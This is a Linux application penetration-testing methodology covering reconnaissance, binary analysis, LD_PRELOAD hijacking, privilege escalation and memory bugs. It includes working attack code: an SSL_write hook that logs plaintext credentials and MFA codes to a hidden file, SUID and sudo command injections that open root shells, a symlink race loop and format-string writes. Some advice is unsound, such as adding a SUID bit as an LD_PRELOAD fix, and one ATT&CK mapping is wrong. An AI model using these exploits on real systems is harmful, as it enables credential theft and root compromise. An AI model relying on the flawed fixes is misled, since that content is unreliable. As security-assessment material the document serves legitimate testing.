# Linux Application Security Testing Methodology

**Version:** 1.0
**Date:** 2026-01-28
**Classification:** Comprehensive thick client testing for Linux desktop and server applications

---

## Authoritative References

This methodology synthesizes guidance from multiple authoritative sources to provide comprehensive coverage of Linux application security testing:

### Industry Standards
- **[PTES](http://www.pentest-standard.org/)** - Penetration Testing Execution Standard
- **[NIST SP 800-115](https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-115.pdf)** - Technical Guide to Information Security Testing and Assessment
- **[OSSTMM 3](https://www.isecom.org/OSSTMM.3.pdf)** - Open Source Security Testing Methodology Manual
- **[MITRE ATT&CK](https://attack.mitre.org/)** - Enterprise ATT&CK Framework (v16, October 2024)

### Thick Client Specific
- **[OWASP TASVS](https://owasp.org/www-project-thick-client-application-security-verification-standard/)** - Thick Client Application Security Verification Standard
- **[CyberArk Thick Client Methodology](https://www.cyberark.com/resources/threat-research-blog/thick-client-penetration-testing-methodology)**

### Linux Security Standards
- **[CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)** - Linux distribution-specific security configurations
  - [Red Hat Enterprise Linux](https://ncp.nist.gov/checklist/1210)
  - [Ubuntu Linux](https://ncp.nist.gov/checklist/1222)
  - [Debian Linux](https://ncp.nist.gov/checklist/1131)
- **[SEI CERT C Coding Standard](https://wiki.sei.cmu.edu/confluence/display/seccode)** - Secure coding practices for C/C++ applications

### Reverse Engineering and Binary Analysis
- **[Ghidra Training](https://wrongbaud.github.io/posts/ghidra-training/)** - NSA's reverse engineering framework (2024 guides)
- **[Practical Windows Reverse Engineering](https://ringzer0.training/bootstrap25-everyday-ghidra-practical-windows-reverse-engineering/)** - Binary analysis techniques

---

## Overview

Linux application security testing evaluates desktop and server applications running on Linux platforms for vulnerabilities including buffer overflows, privilege escalation, insecure file operations, and shared library exploits.

**Target Applications:**
- Desktop applications (GTK, Qt, Electron)
- Server daemons and services
- Command-line utilities
- System services and background processes

**Key Threat Vectors:**
- LD_PRELOAD shared library injection
- Buffer overflows (stack and heap)
- Race conditions (TOCTOU)
- Privilege escalation via SUID/SGID binaries
- Insecure file permissions
- Environment variable manipulation

---

## 8-Phase Testing Methodology

### Phase 1: Application Fingerprinting and Reconnaissance

**Objective:** Identify application technology stack, dependencies, and attack surface

#### 1.1 File Format Identification

```bash
# Identify binary format
file /path/to/application

# Expected: ELF 64-bit LSB executable, x86-64, dynamically linked
# Check architecture: x86-64, ARM, etc.
# Check linking: dynamically linked vs statically linked
```

**MITRE ATT&CK Mapping:** [T1082 - System Information Discovery](https://attack.mitre.org/techniques/T1082/)

#### 1.2 Dependency Analysis

```bash
# List shared library dependencies
ldd /path/to/application

# Trace library loading at runtime
LD_DEBUG=libs /path/to/application 2>&1 | grep "calling init"

# Check for missing libraries (exploitable?)
ldd /path/to/application | grep "not found"
```

**Security Implications:**
- Missing libraries → DLL hijacking equivalent (LD_PRELOAD)
- Outdated libraries → Known CVEs
- Unusual libraries → Supply chain risk

**Reference:** [CIS Benchmark Section 1.5 - Additional Process Hardening](https://www.cisecurity.org/cis-benchmarks)

#### 1.3 String Extraction

```bash
# Extract readable strings
strings /path/to/application > app-strings.txt

# Search for sensitive patterns
grep -iE '(password|key|token|secret|api|sql|database)' app-strings.txt

# Look for hardcoded credentials
grep -E '(username|user|admin|root)' app-strings.txt

# Find file paths and URLs
grep -E '^(/|http)' app-strings.txt
```

**Findings to Document:**
- Hardcoded credentials
- Database connection strings
- API endpoints
- Configuration file paths
- Debug symbols (indicates debug build)

#### 1.4 Binary Metadata Extraction

```bash
# Check ELF header details
readelf -h /path/to/application

# Entry point address (for debugging)
readelf -h /path/to/application | grep "Entry point"

# Section headers (identify code vs data sections)
readelf -S /path/to/application

# Check for stripped symbols
file /path/to/application | grep -q "not stripped" && echo "Symbols present" || echo "Stripped"
```

**PTES Reference:** Section 3.1.1 - Target Identification ([PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page))

#### 1.5 Configuration File Discovery

```bash
# Common config locations
ls -la ~/.config/appname/
ls -la /etc/appname/
ls -la ~/.appname/

# Search for config files
find /etc -name "*appname*" 2>/dev/null
find ~ -name ".appnamerc" 2>/dev/null

# Check for world-readable configs (security issue)
find /etc/appname -type f -perm -o+r 2>/dev/null
```

**CIS Benchmark Mapping:** Section 6.1 - Ensure permissions on system files are configured

---

### Phase 2: Binary Analysis and Reverse Engineering

**Objective:** Understand application logic, identify vulnerabilities through static analysis

#### 2.1 Security Feature Detection

```bash
# Check for security mitigations
checksec --file=/path/to/application

# Look for:
# - RELRO (Relocation Read-Only): Full RELRO = best
# - Stack Canary: Found = stack overflow protection
# - NX (No-eXecute): Enabled = non-executable stack
# - PIE (Position Independent Executable): Enabled = ASLR support
# - FORTIFY: Enabled = compile-time buffer overflow protection
```

**Security Implications:**
| Feature | Status | Risk |
|---------|--------|------|
| No RELRO | Missing | GOT overwrite possible |
| No Canary | Missing | Stack buffer overflow exploitable |
| NX disabled | Missing | Shellcode execution on stack |
| No PIE | Missing | Fixed memory addresses (easier ROP) |

**SEI CERT C Reference:** [MEM35-C - Allocate sufficient memory for an object](https://wiki.sei.cmu.edu/confluence/display/c/MEM35-C.+Allocate+sufficient+memory+for+an+object)

#### 2.2 Disassembly with Ghidra

**Setup:**
```bash
# Launch Ghidra
ghidraRun

# Or headless analysis
analyzeHeadless /path/to/project ProjectName -import /path/to/application -postScript analyze.py
```

**Analysis Tasks:**
1. **Identify main() function** - Entry point for analysis
2. **Trace user input handling** - Follow data flow from input functions
3. **Find authentication logic** - Look for password comparison functions
4. **Identify file operations** - fopen(), open(), read(), write()
5. **Search for command execution** - system(), execve(), popen()

**Ghidra Analysis Techniques (2024 Methods):**
- Use **Auto Analysis** to detect functions and data structures
- **Function Graph View** to visualize control flow
- **Decompiler** to generate pseudo-C code
- **Cross-references** (Ctrl+Shift+F) to find function usage
- **Custom Scripts** to automate analysis patterns

**Reference:** [Introduction to Reverse Engineering with Ghidra](https://hackaday.io/course/172292-introduction-to-reverse-engineering-with-ghidra)

#### 2.3 Dynamic Analysis with GDB

```bash
# Attach debugger to running process
gdb -p $(pidof application)

# Or start application under debugger
gdb /path/to/application

# Useful GDB commands:
# info functions              # List all functions
# disassemble main            # Disassemble function
# break *0x401234             # Set breakpoint at address
# run arg1 arg2               # Run with arguments
# x/20x $rsp                  # Examine stack
# backtrace                   # Show call stack
```

**Advanced GDB Tools:**
- **pwndbg** - Enhanced debugging (heap inspection, ROP gadgets)
- **gef** - GDB Enhanced Features (exploit development)
- **peda** - Python Exploit Development Assistance

**NIST SP 800-115 Reference:** Section 4.4.3 - Source Code Review ([NIST SP 800-115](https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-115.pdf))

#### 2.4 Vulnerability Pattern Identification

**Common Vulnerable Functions (CERT C Secure Coding):**

```c
// Buffer overflow vulnerabilities
strcpy()   // Use strncpy() or strlcpy()
strcat()   // Use strncat() or strlcat()
sprintf()  // Use snprintf()
gets()     // NEVER use - use fgets()

// Format string vulnerabilities
printf(user_input)  // Use printf("%s", user_input)

// Command injection
system(user_controlled)  // Validate input, use execve()
popen(user_controlled)   // Validate input, avoid shell

// Race conditions (TOCTOU)
access() then open()  // Use open() with O_CREAT | O_EXCL
stat() then operation // Atomic operations only
```

**CERT C Mapping:**
- [STR31-C](https://wiki.sei.cmu.edu/confluence/display/c/STR31-C) - Guarantee that storage for strings has sufficient space
- [FIO45-C](https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C) - Avoid TOCTOU race conditions

---

### Phase 3: Runtime Analysis and Instrumentation

**Objective:** Observe application behavior during execution, identify runtime vulnerabilities

#### 3.1 System Call Tracing

```bash
# Trace all system calls
strace -f -o strace-output.txt /path/to/application

# Trace specific system calls
strace -e trace=open,read,write,connect /path/to/application

# Trace child processes
strace -f -e trace=execve /path/to/application

# Filter for sensitive operations
strace /path/to/application 2>&1 | grep -E '(open|read|write|connect|bind|execve)'
```

**Analysis Focus:**
- File operations: Check for insecure permissions, temp file usage
- Network operations: Unencrypted connections, hardcoded IPs
- Process creation: Command injection, shell usage
- Memory operations: mmap with PROT_EXEC (potential shellcode)

**OSSTMM Reference:** Section B - Process Verification Testing

#### 3.2 Library Call Tracing

```bash
# Trace library function calls
ltrace -o ltrace-output.txt /path/to/application

# Trace specific functions
ltrace -e malloc,free,strcpy /path/to/application

# Count function calls
ltrace -c /path/to/application
```

**Security Analysis:**
- `strcpy()` usage without bounds checking
- `malloc(user_controlled_size)` - Integer overflow risk
- `system()` or `popen()` calls - Command injection risk
- `getenv()` - Environment variable usage

#### 3.3 File Descriptor Monitoring

```bash
# Monitor open files while app is running
lsof -p $(pidof application)

# Watch file operations in real-time
watch -n 1 'lsof -p $(pidof application) | tail -20'

# Check for world-writable files opened
lsof -p $(pidof application) | awk '{print $9}' | xargs -I {} stat -c "%A %n" {} 2>/dev/null | grep "^-rw-rw-rw-"
```

**Findings:**
- Temporary files in /tmp without O_EXCL (race condition)
- World-writable files (privilege escalation)
- Files opened as root (if applicable)

**CIS Benchmark:** Section 1.1.21 - Ensure sticky bit is set on all world-writable directories

#### 3.4 Network Traffic Analysis

```bash
# Capture application network traffic
sudo tcpdump -i any -w app-traffic.pcap host 0.0.0.0 or dst port 443

# Filter by process (requires PID)
sudo tcpdump -i any -w app-traffic.pcap proc $(pidof application)

# Analyze in Wireshark
wireshark app-traffic.pcap
```

**Security Checks:**
- Unencrypted HTTP traffic (sensitive data exposure)
- Weak TLS versions (SSLv3, TLS 1.0)
- Certificate validation (test with self-signed cert)
- Hardcoded IP addresses (no DNS)

**MITRE ATT&CK:** [T1040 - Network Sniffing](https://attack.mitre.org/techniques/T1040/)

---

### Phase 4: Shared Library Exploitation (LD_PRELOAD)

**Objective:** Test for dynamic library hijacking vulnerabilities

**Reference:** [MITRE ATT&CK T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006/)

#### 4.1 LD_PRELOAD Injection Test

**Create malicious library:**
```c
// malicious.c
#include <stdio.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    printf("[!] LD_PRELOAD injection successful\n");
    printf("[*] UID: %d\n", getuid());
    printf("[*] Payload executed\n");
}
```

**Compile and test:**
```bash
# Compile malicious library
gcc -shared -fPIC -o malicious.so malicious.c

# Test injection
LD_PRELOAD=./malicious.so /path/to/application

# If successful, payload executes before main()
```

**Security Impact:**
- If application runs with elevated privileges → privilege escalation
- If application handles sensitive data → data interception
- Persistence mechanism (via /etc/ld.so.preload)

#### 4.2 RPATH/RUNPATH Exploitation

```bash
# Check for insecure RPATH/RUNPATH
readelf -d /path/to/application | grep -E '(RPATH|RUNPATH)'

# Vulnerable patterns:
# RUNPATH: /tmp           (attacker-writable)
# RUNPATH: .              (current directory)
# RUNPATH: $ORIGIN        (relative path, depends on context)
```

**Exploitation:**
```bash
# If RUNPATH includes /tmp
cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/libc.so.6
# Modify libc.so.6 to include malicious code
LD_LIBRARY_PATH=/tmp /path/to/application
```

**OWASP TASVS:** Requirement 2.8 - Applications must not load libraries from untrusted locations

#### 4.3 Missing Library Exploitation

```bash
# Check for missing dependencies
ldd /path/to/application | grep "not found"

# Example output:
# libcustom.so.1 => not found

# Create malicious library with same name
gcc -shared -fPIC -o libcustom.so.1 malicious.c

# Place in library search path
export LD_LIBRARY_PATH=.:$LD_LIBRARY_PATH
/path/to/application
```

**Defense:** Applications should use absolute paths for critical libraries

---

### Phase 5: Configuration and File Permission Testing

**Objective:** Identify insecure file permissions and configurations

**Reference:** CIS Benchmark Section 6 - System File Permissions

#### 5.1 Configuration File Security

```bash
# Find application config files
find /etc -name "*appname*" -o -name "*app*" 2>/dev/null
find ~/.config -name "*appname*" 2>/dev/null

# Check permissions (world-readable = issue)
find /etc/appname -type f -perm /o+r -ls 2>/dev/null

# Check for hardcoded credentials in configs
grep -riE '(password|passwd|pwd|secret|key|token)' /etc/appname/ ~/.config/appname/ 2>/dev/null
```

**Security Issues:**
| Finding | Risk | Severity |
|---------|------|----------|
| World-readable config with passwords | Credential disclosure | High |
| World-writable config | Configuration tampering | Critical |
| Hardcoded API keys | Key compromise | High |

**NIST SP 800-115:** Section 3.4 - Configuration Review

#### 5.2 Temporary File Security

```bash
# Monitor temp file creation
inotifywait -m /tmp -e create -e open | grep appname

# Check for predictable temp file names
strace /path/to/application 2>&1 | grep "/tmp/" | grep -E '(open|creat)'

# Example vulnerable pattern:
# open("/tmp/app.tmp", O_CREAT|O_WRONLY) = race condition
# Secure pattern:
# open("/tmp/app.XXXXXX", O_CREAT|O_EXCL|O_WRONLY) = secure
```

**Exploitation (TOCTOU Race Condition):**
```bash
#!/bin/bash
# Race condition exploit
while true; do
  ln -s /etc/passwd /tmp/app.tmp 2>/dev/null
  rm /tmp/app.tmp 2>/dev/null
done &

/path/to/application  # If writes to /tmp/app.tmp without O_EXCL
```

**CERT C:** [FIO21-C](https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C) - Do not create temporary files in shared directories

#### 5.3 Log File Security

```bash
# Find log files
find /var/log -name "*appname*" 2>/dev/null

# Check permissions
ls -la /var/log/appname/

# Check for sensitive data in logs
grep -riE '(password|token|credit.?card|ssn)' /var/log/appname/ 2>/dev/null
```

**Common Issues:**
- Passwords logged in cleartext
- Session tokens in logs (session hijacking)
- PII in logs (compliance violation - GDPR, HIPAA)
- World-readable logs

---

### Phase 6: Privilege Escalation Testing

**Objective:** Identify paths to elevated privileges

**MITRE ATT&CK:** [TA0004 - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)

#### 6.1 SUID/SGID Binary Analysis

```bash
# Find SUID binaries owned by application
find /usr -perm -4000 -user appuser -ls 2>/dev/null

# Find SGID binaries
find /usr -perm -2000 -group appgroup -ls 2>/dev/null

# Analyze SUID binary with ltrace
ltrace -u appuser /usr/bin/suid_binary
```

**Exploitation Patterns:**
1. **Command injection in SUID binary**
   ```bash
   # If SUID binary calls system() with user input
   /usr/bin/suid_binary "input; /bin/sh"
   ```

2. **LD_PRELOAD with SUID (CVE-specific)**
   ```bash
   # Test if LD_PRELOAD is honored (should be disabled)
   LD_PRELOAD=./malicious.so /usr/bin/suid_binary
   ```

3. **Path hijacking**
   ```bash
   # If SUID binary uses relative paths
   export PATH=.:$PATH
   echo '#!/bin/bash\n/bin/sh' > ls
   chmod +x ls
   /usr/bin/suid_binary  # Calls ls without absolute path
   ```

**OWASP TASVS:** Requirement 3.4 - Applications should not require SUID/SGID unless absolutely necessary

#### 6.2 Capabilities Analysis

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Check if application uses capabilities
getcap /path/to/application

# Dangerous capabilities:
# cap_setuid=ep       - Can change UID (root escalation)
# cap_net_raw=ep      - Can sniff network traffic
# cap_dac_override=ep - Can bypass file permissions
```

**Exploitation Example:**
```bash
# If application has cap_setuid+ep
/path/to/application
# Within application, can call setuid(0) to become root
```

**Reference:** [Linux Capabilities Man Page](https://man7.org/linux/man-pages/man7/capabilities.7.html)

#### 6.3 Sudo Misconfiguration

```bash
# Check sudo permissions for application
sudo -l | grep appname

# Vulnerable patterns:
# (ALL) NOPASSWD: /usr/bin/app *
# (root) NOPASSWD: /usr/bin/app

# Test for command injection
sudo /usr/bin/app "normal input; /bin/sh"
```

**MITRE ATT&CK:** [T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)

---

### Phase 7: Memory Corruption Vulnerabilities

**Objective:** Identify and exploit buffer overflows, format strings, and memory bugs

**Reference:** [SEI CERT C MEM Section](https://wiki.sei.cmu.edu/confluence/display/c/MEM+-+Memory+Management)

#### 7.1 Buffer Overflow Detection

**Static Analysis:**
```bash
# Search for vulnerable functions in binary
objdump -d /path/to/application | grep -E '(strcpy|strcat|sprintf|gets)'

# In Ghidra: Search → For Strings → Filter by dangerous functions
```

**Fuzzing:**
```bash
# Simple fuzzer for command-line input
for i in {1..100}; do
  /path/to/application $(python3 -c "print('A' * $i)")
done

# Monitor for crashes
dmesg | tail -20 | grep segfault
```

**Advanced Fuzzing (AFL++):**
```bash
# Compile with AFL instrumentation
afl-gcc -o app-fuzzed app.c

# Run fuzzer
afl-fuzz -i input_dir -o output_dir -- ./app-fuzzed @@
```

**NIST SP 800-115:** Section 4.4.4 - Penetration Testing

#### 7.2 Format String Vulnerability

**Test Pattern:**
```bash
# Test for format string bug
/path/to/application "%x %x %x %x %x"
/path/to/application "%s %s %s"

# If application crashes or leaks memory addresses = vulnerable
```

**Exploitation:**
```bash
# Leak stack values
/path/to/application "%p %p %p %p"

# Write to arbitrary address (advanced)
/path/to/application "AAAA%n"
```

**CERT C:** [FIO30-C](https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C) - Exclude user input from format strings

#### 7.3 Heap Overflow Detection

```bash
# Run with Address Sanitizer (if available)
LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libasan.so.5 /path/to/application

# Or compile with ASAN
gcc -fsanitize=address -g app.c -o app-asan
./app-asan

# Check for heap corruption
```

**Tools:**
- **Valgrind** - Memory leak and corruption detector
- **Dr. Memory** - Memory debugging tool
- **Electric Fence** - Malloc debugger

---

### Phase 8: Network Communication Security

**Objective:** Verify secure network communication and API interactions

**OWASP TASVS:** Section 6 - Network Communication Requirements

#### 8.1 TLS/SSL Configuration Testing

```bash
# Capture TLS handshake
sudo tcpdump -i any -w tls-capture.pcap port 443

# Analyze with Wireshark
wireshark tls-capture.pcap
# Filter: ssl.handshake.type == 1

# Check TLS version
openssl s_client -connect target:443 -tls1_2
openssl s_client -connect target:443 -tls1_1  # Should fail
```

**Security Checks:**
- TLS 1.2 or higher required
- Strong cipher suites (no RC4, DES, MD5)
- Certificate validation enabled
- Certificate pinning (if applicable)

#### 8.2 API Endpoint Discovery

```bash
# Extract URLs from binary
strings /path/to/application | grep -E 'https?://'

# Monitor API calls at runtime
strace -e trace=connect /path/to/application 2>&1 | grep -v ENOENT

# Use proxy for HTTP/HTTPS inspection
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
/path/to/application
```

**Reaper Integration:**
```bash
# Start reaper container
docker compose up -d reaper

# Configure application to use reaper proxy
export http_proxy=http://reaper:8080
export https_proxy=http://reaper:8080

# Run application and capture traffic
/path/to/application

# Query captured API endpoints
sqlite3 /opt/pentest-data/reaper.db \
  "SELECT DISTINCT url FROM requests WHERE host LIKE '%api%'"
```

#### 8.3 Certificate Validation Testing

```bash
# Test with self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Setup test server with self-signed cert
openssl s_server -cert cert.pem -key key.pem -accept 8443

# Point application to test server
# If application accepts self-signed cert = VULNERABILITY
```

**Finding:** Applications must reject invalid certificates (expired, self-signed, hostname mismatch)

---

## Tool Reference

### Static Analysis
- **Ghidra** - Reverse engineering (NSA, free)
- **radare2** - Binary analysis framework
- **Binary Ninja** - Commercial disassembler
- **checksec** - Security feature detection

### Dynamic Analysis
- **GDB** with **pwndbg**/**gef**/**peda** - Debugging
- **strace** - System call tracing
- **ltrace** - Library call tracing
- **lsof** - File descriptor monitoring
- **inotifywait** - File system event monitoring

### Fuzzing
- **AFL++** - American Fuzzy Lop (coverage-guided)
- **Radamsa** - General-purpose fuzzer
- **Honggfuzz** - Security-oriented fuzzer

### Memory Analysis
- **Valgrind** - Memory debugger
- **Address Sanitizer (ASAN)** - Compiler-based detection
- **Electric Fence** - Malloc debugger

### Network
- **tcpdump** - Packet capture
- **Wireshark** - Traffic analysis
- **reaper** - HTTP/HTTPS proxy with database

---

## Common Vulnerabilities

| Vulnerability | MITRE ATT&CK | CWE | Severity |
|---------------|--------------|-----|----------|
| Buffer Overflow | T1203 | CWE-119 | Critical |
| LD_PRELOAD Injection | T1574.006 | CWE-426 | High |
| SUID Exploitation | T1548.001 | CWE-250 | High |
| Format String | T1203 | CWE-134 | High |
| TOCTOU Race Condition | T1070.004 | CWE-367 | Medium |
| Insecure Temp Files | T1070.004 | CWE-377 | Medium |
| Weak File Permissions | T1222.002 | CWE-732 | Medium |
| Hardcoded Credentials | N/A | CWE-798 | High |
| Command Injection | T1059.004 | CWE-78 | Critical |
| Path Traversal | T1083 | CWE-22 | High |

---

## Vulnerability Finding Examples

### Finding 1: SUID Binary Command Injection — Root Privilege Escalation

**Severity:** Critical (CVSS 8.8)
**ATT&CK:** T1548.001 (Setuid and Setgid), T1059.004 (Unix Shell)
**CWE:** CWE-78 (OS Command Injection)
**TASVS:** Requirement 3.4

**Vulnerable Binary:**
```c
// backup-tool.c (installed SUID root)
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: backup-tool <directory>\n");
        return 1;
    }
    char cmd[256];
    // VULNERABLE: User input passed directly to system()
    snprintf(cmd, sizeof(cmd), "tar czf /var/backups/backup.tar.gz %s", argv[1]);
    system(cmd);
    printf("Backup complete.\n");
    return 0;
}
```

**Discovery:**
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Output includes:
# -rwsr-xr-x 1 root root 16384 Jan 15 2026 /usr/local/bin/backup-tool

# Check for dangerous function calls
ltrace /usr/local/bin/backup-tool /tmp/test 2>&1 | grep system
# system("tar czf /var/backups/backup.tar.gz /tmp/test") = 0

# Verify user input reaches system()
strings /usr/local/bin/backup-tool | grep -E '(system|popen|exec)'
# system
# tar czf /var/backups/backup.tar.gz %s
```

**Exploitation:**
```bash
# Inject shell command via argument
/usr/local/bin/backup-tool "/tmp/test; id"

# Expected output:
# uid=0(root) gid=1000(attacker) groups=1000(attacker)
# Backup complete.

# Spawn root shell
/usr/local/bin/backup-tool "/tmp/test; /bin/sh"

# Verify:
# # whoami
# root
```

**Impact:**
- Any local user can escalate to root via command injection
- Full system compromise — read/write all files, install persistence
- No authentication required beyond local user access

**Remediation:**
1. **Remove SUID bit** if root privileges not required: `chmod u-s /usr/local/bin/backup-tool`
2. **Replace `system()` with `execve()`** — does not invoke a shell, prevents injection
3. **Input validation** — whitelist allowed characters, reject shell metacharacters (`;`, `|`, `&`, `` ` ``)
4. **Drop privileges** before executing commands: call `setuid(getuid())` after initialization

---

### Finding 2: LD_PRELOAD Shared Library Injection — Credential Interception

**Severity:** High (CVSS 7.8)
**ATT&CK:** T1574.006 (Dynamic Linker Hijacking)
**CWE:** CWE-426 (Untrusted Search Path)
**TASVS:** Requirement 2.8

**Vulnerable Application:**
```
# Application loads OpenSSL for TLS but doesn't verify library integrity
$ ldd /opt/company/secure-client
    linux-vdso.so.1 (0x00007ffff7fc0000)
    libssl.so.3 => /lib/x86_64-linux-gnu/libssl.so.3 (0x00007f...)
    libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3 (0x00007f...)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)

# Application runs as regular user, no SUID (LD_PRELOAD honored)
$ ls -la /opt/company/secure-client
-rwxr-xr-x 1 root root 245760 Jan 10 2026 /opt/company/secure-client
```

**Exploitation:**
```c
// intercept-ssl.c — Hook SSL_write to capture outgoing data
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>

// Hook SSL_write to log plaintext before encryption
int SSL_write(void *ssl, const void *buf, int num) {
    // Load real SSL_write
    int (*real_ssl_write)(void*, const void*, int);
    real_ssl_write = dlsym(RTLD_NEXT, "SSL_write");

    // Log plaintext data (credentials, tokens, etc.)
    FILE *log = fopen("/tmp/.ssl_capture.log", "a");
    if (log) {
        fprintf(log, "[SSL_write] %d bytes: ", num);
        fwrite(buf, 1, num > 512 ? 512 : num, log);
        fprintf(log, "\n");
        fclose(log);
    }

    return real_ssl_write(ssl, buf, num);
}
```

```bash
# Compile interceptor
gcc -shared -fPIC -o intercept-ssl.so intercept-ssl.c -ldl

# Run application with injected library
LD_PRELOAD=./intercept-ssl.so /opt/company/secure-client

# User logs in normally...
# Check captured data
cat /tmp/.ssl_capture.log

# Expected output:
# [SSL_write] 245 bytes: POST /api/v1/auth HTTP/1.1
# Host: api.company.com
# Content-Type: application/json
# {"username":"admin","password":"P@ssw0rd123!","mfa_code":"482910"}
```

**Impact:**
- Intercept plaintext credentials before TLS encryption
- Capture API tokens, session cookies, MFA codes
- No application modification required — transparent to the user
- Persistence via `/etc/ld.so.preload` (requires root to set up initially)

**Remediation:**
1. **Run as dedicated service user** with restricted environment (systemd `NoNewPrivileges=true`)
2. **Set SUID bit** on the binary (Linux ignores LD_PRELOAD for SUID binaries)
3. **Use static linking** for security-critical libraries (eliminates dynamic loading)
4. **Detect LD_PRELOAD** at startup: check `getenv("LD_PRELOAD")` and abort if set

---

### Finding 3: World-Writable Configuration with Hardcoded Database Credentials

**Severity:** High (CVSS 7.5)
**ATT&CK:** T1552.001 (Credentials in Files)
**CWE:** CWE-732 (Incorrect Permission Assignment), CWE-798 (Hardcoded Credentials)
**TASVS:** Requirements 1.3, 5.2

**Discovery:**
```bash
# Find world-readable/writable config files
find /opt/company -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.yaml" | \
  xargs ls -la 2>/dev/null | grep -E '^-...(r|w).(r|w).(r|w)'

# Output:
# -rw-rw-rw- 1 root root 1245 Jan 10 2026 /opt/company/app/config.yaml

# Check for credentials
grep -riE '(password|passwd|secret|token|key)' /opt/company/app/config.yaml

# Output:
# database:
#   host: db.internal.company.com
#   port: 5432
#   username: app_admin
#   password: Pr0duct10n_DB_2026!
#   database: customer_data
# redis:
#   host: redis.internal.company.com
#   password: R3d1s_Cl34rt3xt
# api_keys:
#   stripe_secret: [STRIPE_SECRET_KEY]
```

**Vulnerable Configuration:**
```yaml
# /opt/company/app/config.yaml (permissions: 666 — world-writable)
database:
  host: db.internal.company.com
  port: 5432
  username: app_admin
  password: Pr0duct10n_DB_2026!
  database: customer_data

redis:
  host: redis.internal.company.com
  password: R3d1s_Cl34rt3xt

api_keys:
  stripe_secret: [STRIPE_SECRET_KEY]
```

**Impact:**
- Any local user can read database credentials → direct database access to customer data
- World-writable permissions allow config modification → redirect app to attacker-controlled database
- Stripe live secret key exposed → financial fraud, unauthorized charges
- Redis password exposed → cache poisoning, session hijacking

**Remediation:**
1. **Fix permissions immediately:** `chmod 600 /opt/company/app/config.yaml && chown appuser:appgroup /opt/company/app/config.yaml`
2. **Move secrets to environment variables** or a secrets manager (HashiCorp Vault, AWS Secrets Manager)
3. **Rotate all exposed credentials** — database password, Redis password, Stripe keys
4. **Audit access logs** for the database and Stripe API for unauthorized access during exposure window

---

## Reporting Template

### Finding Format

**Title:** [Vulnerability Name] in [Application Name]

**Severity:** [Critical/High/Medium/Low]

**CVSS Score:** [Calculate using CVSS 3.1]

**CWE:** [CWE-XXX]

**MITRE ATT&CK:** [Technique ID]

**Description:**
[Detailed explanation of vulnerability]

**Affected Component:**
- Binary: /path/to/application
- Function: function_name() at offset 0xABCD
- Library: libname.so.1

**Proof of Concept:**
```bash
[Reproduction steps]
```

**Impact:**
[What attacker can achieve]

**Remediation:**
[Specific fix recommendations]

**References:**
- CERT C: [Link to specific guideline]
- CIS Benchmark: [Specific control]
- OWASP TASVS: [Requirement number]

---

## Sources

This methodology references the following authoritative sources:

**Standards:**
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [NIST SP 800-115 - Technical Guide to Information Security Testing](https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-115.pdf)
- [OSSTMM 3 - Open Source Security Testing Methodology Manual](https://www.isecom.org/OSSTMM.3.pdf)
- [MITRE ATT&CK Enterprise Framework](https://attack.mitre.org/)
- [OWASP Thick Client Application Security Verification Standard (TASVS)](https://owasp.org/www-project-thick-client-application-security-verification-standard/)

**Linux Security:**
- [CIS Benchmarks - Linux Distributions](https://www.cisecurity.org/cis-benchmarks)
- [NIST NCP - CIS Red Hat Enterprise Linux Checklist](https://ncp.nist.gov/checklist/1210)
- [NIST NCP - CIS Ubuntu Linux Checklist](https://ncp.nist.gov/checklist/1222)

**Secure Coding:**
- [SEI CERT C Coding Standard](https://wiki.sei.cmu.edu/confluence/display/seccode)
- [SEI CERT C++ Coding Standard](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682)

**Reverse Engineering:**
- [Ghidra - Introduction to Reverse Engineering](https://hackaday.io/course/172292-introduction-to-reverse-engineering-with-ghidra)
- [Everyday Ghidra: Practical Reverse Engineering](https://ringzer0.training/bootstrap25-everyday-ghidra-practical-windows-reverse-engineering/)
- [Step-by-Step Guide: Reverse Engineering with Ghidra](https://medium.com/aardvark-infinity/step-by-step-guide-reverse-engineering-with-ghidra-cb9f8acb4309)

**Industry Research:**
- [CyberArk - Thick Client Penetration Testing Methodology](https://www.cyberark.com/resources/threat-research-blog/thick-client-penetration-testing-methodology)
- [BreachLock - Understanding Thick Client Application Penetration Testing](https://www.breachlock.com/resources/blog/understanding-thick-client-application-penetration-testing/)

---

**Last Updated:** 2026-01-28
**Version:** 1.0
**Status:** Active
